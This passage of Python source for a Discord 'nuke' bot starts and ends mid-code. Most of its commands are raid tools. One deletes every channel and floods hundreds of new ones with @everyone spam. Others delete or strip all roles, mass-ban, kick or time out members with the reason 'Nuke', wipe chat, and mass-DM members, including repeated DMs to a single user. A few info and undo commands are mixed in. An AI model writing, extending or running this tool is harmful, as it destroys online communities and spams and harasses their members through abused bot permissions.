                 for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "showall")
    await _log_embed(_action_embed("👁️ Showed All Channels", 0x57f287,
        [("Channels shown", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def slowall(ctx, seconds: int):
    count = len(ctx.guild.text_channels)
    await batch([ch.edit(slowmode_delay=seconds) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"slowall {seconds}s")
    await _log_embed(_action_embed("⏱️ Slowmode Set on All Channels", 0xffa500,
        [("Delay", f"{seconds}s", True), ("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def nsfwall(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.edit(nsfw=True) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "nsfwall")
    await _log_embed(_action_embed("🔞 Marked All Channels NSFW", 0xff0000,
        [("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unnsfwall(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.edit(nsfw=False) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "unnsfwall")
    await _log_embed(_action_embed("✅ Unmarked NSFW on All Channels", 0x57f287,
        [("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def topicall(ctx, *, topic: str):
    count = len(ctx.guild.text_channels)
    await batch([ch.edit(topic=topic) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "topicall")
    await _log_embed(_action_embed("📝 Set Topic on All Channels", 0x00b0f4,
        [("Topic", topic[:200], False), ("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delpins(ctx):
    pins = await ctx.channel.pins()
    await batch([msg.unpin() for msg in pins], **BATCH_MSG)
    await status(ctx, "delpins")
    await _log_embed(_action_embed("📌 Deleted Pins", 0xff0000,
        [("Channel", f"#{ctx.channel.name}", True), ("Pins removed", len(pins), True)]))

@bot.command()
async def delpinsall(ctx):
    total = 0
    async def unpin_all(ch):
        nonlocal total
        pins = await safe(ch.pins())
        if pins:
            total += len(pins)
            for msg in pins:
                await safe(msg.unpin())
    await batch([unpin_all(ch) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "delpinsall")
    await _log_embed(_action_embed("📌 Deleted All Pins", 0xff0000,
        [("Total removed", total, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def clonech(ctx, channel: discord.TextChannel, count: int):
    await batch([channel.clone() for _ in range(count)], **BATCH_CH)
    await status(ctx, f"clonech {channel.name} x{count}")
    await _log_embed(_action_embed("📋 Channel Cloned", 0x00b0f4,
        [("Source", f"#{channel.name}", True), ("Copies", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def channelinfo(ctx):
    lines = [f"`{ch.id}` — #{ch.name} ({type(ch).__name__})" for ch in ctx.guild.channels]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def movech(ctx, channel: discord.TextChannel, category: discord.CategoryChannel):
    await channel.edit(category=category)
    await status(ctx, f"movech #{channel.name} → {category.name}")
    await _log_embed(_action_embed("📁 Channel Moved", 0x00b0f4,
        [("Channel", f"#{channel.name}", True), ("Category", category.name, True)]))

@bot.command()
async def cloneall(ctx):
    count = len(ctx.guild.channels)
    await batch([ch.clone() for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "cloneall")
    await _log_embed(_action_embed("📋 Cloned All Channels", 0x00b0f4,
        [("Channels cloned", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def archivech(ctx, channel: discord.TextChannel):
    archive_cat = discord.utils.get(ctx.guild.categories, name="Archive")
    if not archive_cat:
        archive_cat = await ctx.guild.create_category("Archive")
    await channel.edit(category=archive_cat)
    await status(ctx, f"archivech #{channel.name}")
    await _log_embed(_action_embed("🗄️ Channel Archived", 0x9b59b6,
        [("Channel", f"#{channel.name}", True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def vcbitrate(ctx, channel: discord.VoiceChannel, bitrate: int):
    bps = max(8000, min(bitrate, 96000))
    await channel.edit(bitrate=bps)
    await status(ctx, f"vcbitrate #{channel.name} {bps}")
    await _log_embed(_action_embed("🔊 VC Bitrate Set", 0x00b0f4,
        [("Channel", f"#{channel.name}", True), ("Bitrate", f"{bps} bps", True)]))

@bot.command()
async def vcbitrateall(ctx, bitrate: int):
    bps = max(8000, min(bitrate, 96000))
    count = len(ctx.guild.voice_channels)
    await batch([ch.edit(bitrate=bps) for ch in ctx.guild.voice_channels], **BATCH_CH)
    await status(ctx, f"vcbitrateall {bps}")
    await _log_embed(_action_embed("🔊 Bitrate Set on All VCs", 0x00b0f4,
        [("Bitrate", f"{bps} bps", True), ("VCs", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def vclimit(ctx, channel: discord.VoiceChannel, limit: int):
    lim = max(0, limit)
    await channel.edit(user_limit=lim)
    await status(ctx, f"vclimit #{channel.name} {lim}")
    await _log_embed(_action_embed("👥 VC User Limit Set", 0x00b0f4,
        [("Channel", f"#{channel.name}", True), ("Limit", lim or "unlimited", True)]))

@bot.command()
async def vclimitall(ctx, limit: int):
    lim = max(0, limit)
    count = len(ctx.guild.voice_channels)
    await batch([ch.edit(user_limit=lim) for ch in ctx.guild.voice_channels], **BATCH_CH)
    await status(ctx, f"vclimitall {lim}")
    await _log_embed(_action_embed("👥 User Limit Set on All VCs", 0x00b0f4,
        [("Limit", lim or "unlimited", True), ("VCs", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def createinvite(ctx, channel: discord.TextChannel = None):
    ch = channel or ctx.channel
    invite = await ch.create_invite(max_age=0, max_uses=0, unique=True)
    await ctx.send(f"🔗 Permanent invite: {invite.url}")
    await _log_embed(_action_embed("🔗 Invite Created", 0x57f287,
        [("Channel", f"#{ch.name}", True), ("Link", invite.url, False)]))

@bot.command()
async def wipechat(ctx):
    await ctx.channel.purge(limit=None)
    await _log_embed(_action_embed("🧹 Chat Wiped", 0xff0000,
        [("Channel", f"#{ctx.channel.name}", True), ("Guild", ctx.guild.name, True)]))

# ─────────────────────────────────────────────
# NUKE
# ─────────────────────────────────────────────

async def _fast_delete_channels(guild: discord.Guild, concurrency: int = 30):
    """Delete all channels as fast as possible using a high-concurrency semaphore."""
    sem = asyncio.Semaphore(concurrency)
    async def _del(ch):
        async with sem:
            await safe(ch.delete())
    await asyncio.gather(*[_del(ch) for ch in guild.channels])

@bot.command()
async def nuke(ctx, name: str, *, message: str = "@everyone"):
    global STOPPED
    STOPPED = False
    await _fast_delete_channels(ctx.guild)
    ch_sem = asyncio.Semaphore(5)
    async def nuke_one():
        async with ch_sem:
            if STOPPED:
                return
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
        await asyncio.gather(*[safe(ch.send(message)) for _ in range(30)])
    await asyncio.gather(*[nuke_one() for _ in range(500)])
    await status(ctx, "nuke")
    await _log_embed(_action_embed("💥 NUKE EXECUTED", 0xff0000,
        [("Channel name", name, True), ("Message", message[:200], False), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def nukeall(ctx, *, name: str = "nuked"):
    await _fast_delete_channels(ctx.guild)
    await batch([ctx.guild.create_text_channel(name) for _ in range(10)], **BATCH_CH)
    await status(ctx, f"nukeall {name}")
    await _log_embed(_action_embed("💥 Nuke All Executed", 0xff0000,
        [("New channel name", name, True), ("Guild", ctx.guild.name, True)]))

# ─────────────────────────────────────────────
# ROLES
# ─────────────────────────────────────────────

@bot.command()
async def mr(ctx, name: str, count: int):
    await batch([ctx.guild.create_role(name=name) for _ in range(count)], **BATCH_ROLE)
    await status(ctx, f"mr {name} x{count}")
    await _log_embed(_action_embed("🎭 Mass Created Roles", 0xffa500,
        [("Name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def dar(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.delete() for r in targets], **BATCH_ROLE)
    await status(ctx, "dar")
    await _log_embed(_action_embed("🗑️ Deleted All Roles", 0xff0000,
        [("Deleted", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def renameallr(ctx, *, name: str):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(name=name) for r in targets], **BATCH_ROLE)
    await status(ctx, f"renameallr {name}")
    await _log_embed(_action_embed("✏️ Renamed All Roles", 0xffa500,
        [("New name", name, True), ("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massrole(ctx, role: discord.Role):
    targets = [m for m in ctx.guild.members if not m.bot]
    await batch([m.add_roles(role) for m in targets], **BATCH_MBR)
    await status(ctx, f"massrole {role.name}")
    await _log_embed(_action_embed("➕ Mass Role Given", 0xffa500,
        [("Role", role.name, True), ("Members", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massremoverole(ctx, role: discord.Role):
    targets = [m for m in ctx.guild.members if role in m.roles]
    await batch([m.remove_roles(role) for m in targets], **BATCH_MBR)
    await status(ctx, f"massremoverole {role.name}")
    await _log_embed(_action_embed("➖ Mass Role Removed", 0xffa500,
        [("Role", role.name, True), ("Members affected", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def stripall(ctx):
    async def strip(m):
        removable = [r for r in m.roles if r != ctx.guild.default_role and r < ctx.guild.me.top_role]
        if removable:
            await m.remove_roles(*removable)
    targets = [m for m in ctx.guild.members if not m.bot]
    await batch([strip(m) for m in targets], **BATCH_MBR)
    await status(ctx, "stripall")
    await _log_embed(_action_embed("🗑️ Stripped All Roles", 0xff0000,
        [("Members affected", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def adminrole(ctx, role: discord.Role):
    await role.edit(permissions=discord.Permissions(administrator=True))
    await status(ctx, f"adminrole {role.name}")
    await _log_embed(_action_embed("👑 Admin Perms Given to Role", 0xffd700,
        [("Role", role.name, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def depermsall(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(permissions=discord.Permissions.none()) for r in targets], **BATCH_ROLE)
    await status(ctx, "depermsall")
    await _log_embed(_action_embed("🚫 Wiped All Role Permissions", 0xff0000,
        [("Roles affected", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def colorallr(ctx, hex_color: str):
    hex_color = hex_color.strip("#")
    try:
        color = discord.Color(int(hex_color, 16))
    except ValueError:
        await ctx.send("❌ Invalid hex color. Example: `!colorallr ff0000`")
        return
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(color=color) for r in targets], **BATCH_ROLE)
    await status(ctx, f"colorallr #{hex_color}")
    await _log_embed(_action_embed("🎨 Colored All Roles", int(hex_color, 16),
        [("Color", f"#{hex_color}", True), ("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def mentionallr(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(mentionable=True) for r in targets], **BATCH_ROLE)
    await status(ctx, "mentionallr")
    await _log_embed(_action_embed("🔔 All Roles Made Mentionable", 0xffa500,
        [("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unmentionallr(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(mentionable=False) for r in targets], **BATCH_ROLE)
    await status(ctx, "unmentionallr")
    await _log_embed(_action_embed("🔕 All Roles Made Unmentionable", 0xffa500,
        [("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def hoistallr(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(hoist=True) for r in targets], **BATCH_ROLE)
    await status(ctx, "hoistallr")
    await _log_embed(_action_embed("⬆️ All Roles Hoisted", 0xffa500,
        [("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unhoistallr(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(hoist=False) for r in targets], **BATCH_ROLE)
    await status(ctx, "unhoistallr")
    await _log_embed(_action_embed("⬇️ All Roles Unhoisted", 0xffa500,
        [("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def listroles(ctx):
    lines = [f"`{r.id}` — @{r.name} ({len(r.members)} members)" for r in ctx.guild.roles]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def roleinfo(ctx, role: discord.Role):
    embed = discord.Embed(title=f"🎭 Role: {role.name}", color=role.color)
    embed.add_field(name="ID", value=str(role.id))
    embed.add_field(name="Color", value=str(role.color))
    embed.add_field(name="Members", value=str(len(role.members)))
    embed.add_field(name="Hoisted", value=str(role.hoist))
    embed.add_field(name="Mentionable", value=str(role.mentionable))
    embed.add_field(name="Position", value=str(role.position))
    embed.add_field(name="Created", value=role.created_at.strftime("%Y-%m-%d"))
    perms = [p for p, v in role.permissions if v]
    embed.add_field(name="Key Perms", value=", ".join(perms[:10]) or "none", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def cloner(ctx, role: discord.Role, *, name: str):
    new_role = await ctx.guild.create_role(
        name=name, permissions=role.permissions,
        color=role.color, hoist=role.hoist, mentionable=role.mentionable,
    )
    await ctx.send(f"✅ Cloned `{role.name}` → `{new_role.name}` (`{new_role.id}`)")
    await _log_embed(_action_embed("📋 Role Cloned", 0xffa500,
        [("Source", role.name, True), ("New role", new_role.name, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def banrole(ctx, role: discord.Role):
    targets = [m for m in role.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.ban(reason=f"banrole: {role.name}") for m in targets], **BATCH_MBR)
    await status(ctx, f"banrole {role.name} ({len(targets)} members)")
    names = ", ".join(str(m) for m in targets[:20])
    await _log_embed(_action_embed("🔨 Banned by Role", 0xff0000,
        [("Role", role.name, True), ("Banned", len(targets), True),
         ("Members (first 20)", names or "none", False)]))

@bot.command()
async def kickrole(ctx, role: discord.Role):
    targets = [m for m in role.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.kick(reason=f"kickrole: {role.name}") for m in targets], **BATCH_MBR)
    await status(ctx, f"kickrole {role.name} ({len(targets)} members)")
    names = ", ".join(str(m) for m in targets[:20])
    await _log_embed(_action_embed("👢 Kicked by Role", 0xff0000,
        [("Role", role.name, True), ("Kicked", len(targets), True),
         ("Members (first 20)", names or "none", False)]))

# ─────────────────────────────────────────────
# MEMBERS
# ─────────────────────────────────────────────

@bot.command()
async def ban(ctx):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.ban(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, "ban")
    await _log_embed(_action_embed("🔨 Mass Ban", 0xff0000,
        [("Banned", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def kick(ctx):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.kick(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, "kick")
    await _log_embed(_action_embed("👢 Mass Kick", 0xff0000,
        [("Kicked", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def mban(ctx, count: int):
    targets = [m for m in ctx.guild.members
               if m != ctx.guild.me and m != ctx.guild.owner and not m.bot][:count]
    await batch([m.ban(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"mban {count}")
    names = ", ".join(str(m) for m in targets[:15])
    await _log_embed(_action_embed("🔨 Partial Mass Ban", 0xff0000,
        [("Requested", count, True), ("Banned", len(targets), True),
         ("Members", names or "none", False)]))

@bot.command()
async def mkick(ctx, count: int):
    targets = [m for m in ctx.guild.members
               if m != ctx.guild.me and m != ctx.guild.owner and not m.bot][:count]
    await batch([m.kick(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"mkick {count}")
    names = ", ".join(str(m) for m in targets[:15])
    await _log_embed(_action_embed("👢 Partial Mass Kick", 0xff0000,
        [("Requested", count, True), ("Kicked", len(targets), True),
         ("Members", names or "none", False)]))

@bot.command()
async def massunban(ctx):
    bans = [entry async for entry in ctx.guild.bans()]
    await batch([ctx.guild.unban(entry.user) for entry in bans], **BATCH_MBR)
    await status(ctx, "massunban")
    await _log_embed(_action_embed("🔓 Mass Unban", 0x57f287,
        [("Unbanned", len(bans), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massdeafen(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(deafen=True) for m in members], **BATCH_MBR)
    await status(ctx, "massdeafen")
    await _log_embed(_action_embed("🔇 Mass Deafen", 0xff0000,
        [("Deafened", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massmute(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(mute=True) for m in members], **BATCH_MBR)
    await status(ctx, "massmute")
    await _log_embed(_action_embed("🔇 Mass Mute", 0xff0000,
        [("Muted", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def undeafenall(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(deafen=False) for m in members], **BATCH_MBR)
    await status(ctx, "undeafenall")
    await _log_embed(_action_embed("🔊 Mass Undeafen", 0x57f287,
        [("Undeafened", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unmuteall(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(mute=False) for m in members], **BATCH_MBR)
    await status(ctx, "unmuteall")
    await _log_embed(_action_embed("🔊 Mass Unmute", 0x57f287,
        [("Unmuted", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massmove(ctx, channel: discord.VoiceChannel):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.move_to(channel) for m in members], **BATCH_MBR)
    await status(ctx, f"massmove {channel.name}")
    await _log_embed(_action_embed("🔀 Mass Voice Move", 0x00b0f4,
        [("To", f"#{channel.name}", True), ("Moved", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def voicekick(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.move_to(None) for m in members], **BATCH_MBR)
    await status(ctx, "voicekick")
    await _log_embed(_action_embed("👢 Mass Voice Kick", 0xff0000,
        [("Disconnected", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def nickall(ctx, *, nick: str):
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me]
    await batch([m.edit(nick=nick) for m in targets], **BATCH_MBR)
    await status(ctx, f"nickall {nick}")
    await _log_embed(_action_embed("✏️ Mass Nickname Change", 0xffa500,
        [("New nick", nick, True), ("Members", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def resetnicks(ctx):
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me and m.nick]
    await batch([m.edit(nick=None) for m in targets], **BATCH_MBR)
    await status(ctx, "resetnicks")
    await _log_embed(_action_embed("🔄 Mass Nick Reset", 0xffa500,
        [("Reset", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def timeoutall(ctx, minutes: int):
    until = discord.utils.utcnow() + datetime.timedelta(minutes=minutes)
    targets = [m for m in ctx.guild.members
               if not m.bot and m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.timeout(until, reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"timeoutall {minutes}m")
    await _log_embed(_action_embed("⏰ Mass Timeout", 0xff0000,
        [("Duration", f"{minutes} minutes", True), ("Members", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def untimeoutall(ctx):
    targets = [m for m in ctx.guild.members if m.is_timed_out()]
    await batch([m.timeout(None) for m in targets], **BATCH_MBR)
    await status(ctx, "untimeoutall")
    await _log_embed(_action_embed("✅ Mass Timeout Removed", 0x57f287,
        [("Removed from", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def membercount(ctx):
    g = ctx.guild
    total = g.member_count
    bots = sum(1 for m in g.members if m.bot)
    humans = total - bots
    online = sum(1 for m in g.members if m.status != discord.Status.offline)
    embed = discord.Embed(title=f"👥 {g.name} — Member Count", color=0xff0000)
    embed.add_field(name="Total", value=str(total))
    embed.add_field(name="Humans", value=str(humans))
    embed.add_field(name="Bots", value=str(bots))
    embed.add_field(name="Online", value=str(online))
    await ctx.send(embed=embed)

@bot.command()
async def listbans(ctx):
    bans = [entry async for entry in ctx.guild.bans()]
    if not bans:
        await ctx.send("No banned users.")
        return
    lines = [f"`{e.user.id}` — {e.user} ({e.reason or 'No reason'})" for e in bans]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def userinfo(ctx, member: discord.Member):
    embed = discord.Embed(title=f"👤 {member}", color=member.color)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="ID", value=str(member.id))
    embed.add_field(name="Nickname", value=member.nick or "None")
    embed.add_field(name="Bot", value=str(member.bot))
    embed.add_field(name="Joined", value=member.joined_at.strftime("%Y-%m-%d %H:%M") if member.joined_at else "?")
    embed.add_field(name="Created", value=member.created_at.strftime("%Y-%m-%d %H:%M"))
    embed.add_field(name="Top Role", value=member.top_role.mention)
    embed.add_field(name="Roles", value=str(len(member.roles) - 1))
    embed.add_field(name="Status", value=str(member.status))
    embed.add_field(name="Timed Out", value=str(member.is_timed_out()))
    await ctx.send(embed=embed)

@bot.command()
async def banid(ctx, user_id: int):
    member = ctx.guild.get_member(user_id)
    if member:
        await safe(member.ban(reason="banid"))
        await status(ctx, f"banid {user_id}")
        await _log_embed(_action_embed("🔨 Ban by ID", 0xff0000,
            [("User", str(member), True), ("ID", str(user_id), True), ("Guild", ctx.guild.name, True)]))
    else:
        await ctx.send("❌ Member not found. Use `!hackban` for users not in server.")

@bot.command()
async def hackban(ctx, user_id: int):
    await ctx.guild.ban(discord.Object(id=user_id), reason="hackban")
    await status(ctx, f"hackban {user_id}")
    await _log_embed(_action_embed("🔨 Hackban", 0xff0000,
        [("User ID", str(user_id), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def softban(ctx, member: discord.Member):
    await member.ban(reason="softban", delete_message_days=7)
    await ctx.guild.unban(member)
    await status(ctx, f"softban {member}")
    await _log_embed(_action_embed("🪃 Softban", 0xffa500,
        [("User", str(member), True), ("ID", str(member.id), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def joinedafter(ctx, days: int):
    cutoff = discord.utils.utcnow() - datetime.timedelta(days=days)
    recent = [m for m in ctx.guild.members if m.joined_at and m.joined_at > cutoff]
    if not recent:
        await ctx.send(f"No members joined in the last {days} days.")
        return
    lines = [f"`{m.id}` — {m} (joined {m.joined_at.strftime('%Y-%m-%d')})" for m in recent]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def jointime(ctx, member: discord.Member):
    joined = member.joined_at.strftime("%Y-%m-%d %H:%M:%S UTC") if member.joined_at else "Unknown"
    created = member.created_at.strftime("%Y-%m-%d %H:%M:%S UTC")
    await ctx.send(
        f"👤 **{member}**\nJoined server: `{joined}`\nAccount created: `{created}`"
    )

@bot.command()
async def massnick(ctx, role: discord.Role, *, nick: str):
    targets = [m for m in role.members if m != ctx.guild.me]
    await batch([m.edit(nick=nick) for m in targets], **BATCH_MBR)
    await status(ctx, f"massnick {role.name} → {nick}")
    await _log_embed(_action_embed("✏️ Mass Nick by Role", 0xffa500,
        [("Role", role.name, True), ("Nick", nick, True), ("Members", len(targets), True)]))

# ─────────────────────────────────────────────
# MASS DM  — all with per-result logging
# ─────────────────────────────────────────────

async def _dm_batch(targets: list, message: str | None = None,
                    embed: discord.Embed | None = None) -> tuple[int, int, list]:
    """DM a list of members. Returns (sent, failed, failed_list)."""
    sent = 0
    failed = 0
    failed_users = []

    async def send_one(m):
        nonlocal sent, failed
        try:
            if embed:
                await m.send(embed=embed)
            else:
                await m.send(message)
            sent += 1
        except Exception:
            failed += 1
            failed_users.append(str(m))

    await batch([send_one(m) for m in targets], **BATCH_MSG)
    return sent, failed, failed_users

async def _log_dm_result(ctx, label: str, sent: int, failed: int,
                         failed_users: list, extra_fields: list | None = None):
    """Send a clean DM result embed to the log channel."""
    fields = [
        ("✅ Sent", str(sent), True),
        ("❌ Failed", str(failed), True),
        ("Guild", ctx.guild.name, True),
    ]
    if extra_fields:
        fields.extend(extra_fields)
    if failed_users:
        fields.append(("Failed users (first 10)", ", ".join(failed_users[:10]), False))
    await _log_embed(_action_embed(label, 0xff69b4, fields))

@bot.command()
async def dmall(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"dmall — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM All", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def massdmrole(ctx, role: discord.Role, *, message: str):
    targets = [m for m in role.members if not m.bot]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmrole — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, f"📩 DM by Role: {role.name}", sent, failed, fl,
                         [("Role", role.name, True), ("Message", message[:200], False)])

@bot.command()
async def massdmnonrole(ctx, role: discord.Role, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot and role not in m.roles]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmnonrole — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, f"📩 DM Without Role: {role.name}", sent, failed, fl,
                         [("Excluded role", role.name, True), ("Message", message[:200], False)])

@bot.command()
async def massdmnew(ctx, days: int, *, message: str):
    cutoff = discord.utils.utcnow() - datetime.timedelta(days=days)
    targets = [m for m in ctx.guild.members if not m.bot and m.joined_at and m.joined_at > cutoff]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmnew — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, f"📩 DM New Members (<{days}d)", sent, failed, fl,
                         [("Days", days, True), ("Message", message[:200], False)])

@bot.command()
async def massdmids(ctx, ids: str, *, message: str):
    uid_list = [int(x.strip()) for x in ids.split(",") if x.strip().isdigit()]
    targets = [m for uid in uid_list if (m := ctx.guild.get_member(uid))]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmids — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM by ID List", sent, failed, fl,
                         [("IDs provided", len(uid_list), True), ("Message", message[:200], False)])

@bot.command()
async def massdmbots(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if m.bot and m != ctx.guild.me]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmbots — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM Bots", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def massdmoffline(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot and m.status == discord.Status.offline]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmoffline — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM Offline Members", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def massdmonline(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot and m.status == discord.Status.online]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmonline — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM Online Members", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def massdmnoavatar(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot and m.avatar is None]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmnoavatar — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM No-Avatar Members", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def dmallroles(ctx, *, message: str):
    targets = list({m for r in ctx.guild.roles[1:] for m in r.members if not m.bot})
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"dmallroles — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM All Role Holders", sent, failed, fl,
                         [("Unique targets", len(targets), True), ("Message", message[:200], False)])

@bot.command()
async def dmowner(ctx, *, message: str):
    owner = ctx.guild.owner
    sent, failed, fl = await _dm_batch([owner], message=message)
    await status(ctx, f"dmowner — {'sent' if sent else 'failed'}")
    await _log_dm_result(ctx, "📩 DM Owner", sent, failed, fl,
                         [("Owner", str(owner), True), ("Message", message[:200], False)])

@bot.command()
async def dmrepeat(ctx, member: discord.Member, count: int, *, message: str):
    sent = 0
    failed = 0
    for _ in range(count):
        try:
            await member.send(message)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(1.1)
    await status(ctx, f"dmrepeat {member} x{count} — {sent} sent, {failed} failed")
    await _log_embed(_action_embed("📩 DM Repeat", 0xff69b4, [
